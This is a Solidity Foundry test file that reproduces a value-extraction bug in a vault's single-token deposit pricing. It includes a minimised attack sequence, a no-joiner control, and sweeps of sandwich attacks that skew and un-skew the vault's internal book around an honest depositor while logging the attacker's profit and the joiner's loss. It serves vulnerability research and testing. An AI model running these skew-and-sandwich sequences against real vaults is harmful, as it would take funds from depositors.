// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {V3FSFixture} from "./V3FSInvariant.t.sol";

/// @notice Minimisation of the medium-campaign INV-1 break (after spot-mint quarantine):
///   a_syDeposit(token1, ~1000e18)  ->  h_dualDeposit(book-proportional)  ->  a_singleDeposit(token0, ...)
/// Idle mode, pool always at the fair price, no pool manipulation. Single-token zap-in is priced on the vault's INTERNAL
/// constant-product book (free + deployed at P0), so an attacker can skew the book off-market, let a dual
/// depositor join at the skewed book ratio, then un-skew and keep the CP "skew value" of the joiner's stake.
contract V3FSBookSkewTest is V3FSFixture {
    address internal lp = makeAddr("joiningLP");

    function test_repro_shrunkSequence() public {
        h.setHonestJoinAtBookRatio(true); // un-quarantine: honest joins at the live book ratio
        h.setSkewQuarantine(false); // and no skew-value allowance
        int256 p0 = h.attackerProfit();
        h.a_syDeposit(170141183460469231731687303715884105727, 23);
        h.h_dualDeposit(type(uint256).max, 6404516795634494303563140592666219398536105908482572765003975602);
        h.a_singleDeposit(92518982726887792074027793338171676912, 11210302934724190283582662985518396021794107, false, 0);
        console2.log("attacker profit delta (wei)", h.attackerProfit() - p0);
        (bool ok,,) = h.checkNoFreeValue();
        assertFalse(ok, "reproduces INV-1 break");
    }

    function _lpDeposit(uint256 a0, uint256 a1, uint256 minShares) internal returns (bool ok, uint256 sh) {
        IERC20 t0 = IERC20(pool.token0());
        IERC20 t1 = IERC20(pool.token1());
        ERC20PermitMintableStub(address(t0)).mint(lp, a0);
        ERC20PermitMintableStub(address(t1)).mint(lp, a1);
        address[] memory toks = new address[](2);
        toks[0] = address(t0);
        toks[1] = address(t1);
        uint256[] memory am = new uint256[](2);
        am[0] = a0;
        am[1] = a1;
        vm.startPrank(lp);
        t0.approve(address(vault), type(uint256).max);
        t1.approve(address(vault), type(uint256).max);
        try IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, am, IERC20(address(vault)), minShares, lp, false, block.timestamp) returns (uint256 s) {
            (ok, sh) = (true, s);
        } catch {}
        vm.stopPrank();
    }

    /// Controls: skew + unskew with no joiner in between (CP path independence => attacker cannot gain).
    function test_control_noJoiner() public {
        uint256[3] memory xs = [uint256(200 ether), 600 ether, 1200 ether];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            int256 p0 = h.attackerProfit();
            h.a_singleDeposit(1, xs[i], false, 0); // token1 in
            (uint256 r0, uint256 r1) = h.book();
            h.a_singleDeposit(0, r1 - r0, false, 0); // token0 back to book balance
            console2.log("control skew x (e18)", xs[i] / 1e18);
            console2.log("  attacker profit delta", h.attackerProfit() - p0);
            vm.revertToState(snap);
        }
    }

    /// Joiner deposits at the CURRENT book ratio (router/zap computing proportional amounts on-chain,
    /// or a UI quoting the live book). Sweep skew size x joiner size.
    function test_sweep_joinerAtBookRatio() public {
        uint256[3] memory xs = [uint256(200 ether), 600 ether, 1200 ether];
        uint256[3] memory ys = [uint256(1000 ether), 5000 ether, 20000 ether];
        for (uint256 i; i < 3; ++i) {
            for (uint256 j; j < 3; ++j) {
                uint256 snap = vm.snapshotState();
                int256 p0 = h.attackerProfit();
                h.a_singleDeposit(1, xs[i], false, 0);
                (uint256 r0, uint256 r1) = h.book();
                uint256 a0 = ys[j] * r0 / (r0 + r1);
                uint256 a1 = ys[j] * r1 / (r0 + r1);
                (, uint256 sh) = _lpDeposit(a0, a1, 0);
                (r0, r1) = h.book();
                h.a_singleDeposit(0, r1 - r0, false, 0);
                uint256 lpVal = sh * h.nav() / vault.totalSupply();
                console2.log(string.concat(
                    "skew=", vm.toString(xs[i] / 1e18), " joiner=", vm.toString(ys[j] / 1e18),
                    " atkProfit=", vm.toString(h.attackerProfit() - p0),
                    " joinerLoss=", vm.toString(int256(a0 + a1) - int256(lpVal))
                ));
                vm.revertToState(snap);
            }
        }
    }

    uint256 internal sa0;
    uint256 internal sa1;
    uint256 internal sMin;

    function _sandwichOnce(uint256 slipBps, uint256 x, uint256 Y) internal {
        uint256 snap = vm.snapshotState();
        (uint256 r0, uint256 r1) = h.book();
        sa0 = Y * r0 / (r0 + r1);
        sa1 = Y * r1 / (r0 + r1);
        address[] memory toks = new address[](2);
        toks[0] = pool.token0();
        toks[1] = pool.token1();
        uint256[] memory am = new uint256[](2);
        am[0] = sa0;
        am[1] = sa1;
        sMin = IStandardExchangeInMulti(address(vault)).previewExchangeInManyToOne(toks, am, IERC20(address(vault)))
            * (10_000 - slipBps) / 10_000;
        int256 p0 = h.attackerProfit();
        if (x > 0) h.a_singleDeposit(1, x, false, 0); // front-run: skew token1-heavy
        (bool ok, uint256 sh) = _lpDeposit(sa0, sa1, sMin);
        (r0, r1) = h.book();
        if (x > 0 && r1 > r0) h.a_singleDeposit(0, r1 - r0, false, 0); // back-run: un-skew
        uint256 lpVal = ok ? sh * h.nav() / vault.totalSupply() : sa0 + sa1;
        console2.log(string.concat(
            "slipBps=", vm.toString(slipBps), " front=", vm.toString(x / 1e18), ok ? " joined" : " joiner-reverted",
            " atkProfit=", vm.toString(h.attackerProfit() - p0),
            " joinerLoss=", vm.toString(int256(sa0 + sa1) - int256(lpVal))
        ));
        vm.revertToState(snap);
    }

    /// Realistic sandwich: joiner computed amounts + minShares from the pre-attack preview with slippage s.
    function test_sweep_sandwichWithSlippage() public {
        uint256[3] memory slip = [uint256(10), 50, 100]; // bps
        uint256[5] memory xs = [uint256(0), 5 ether, 20 ether, 60 ether, 200 ether];
        for (uint256 k; k < 3; ++k) {
            for (uint256 i; i < 5; ++i) {
                _sandwichOnce(slip[k], xs[i], 5000 ether);
            }
        }
    }
}
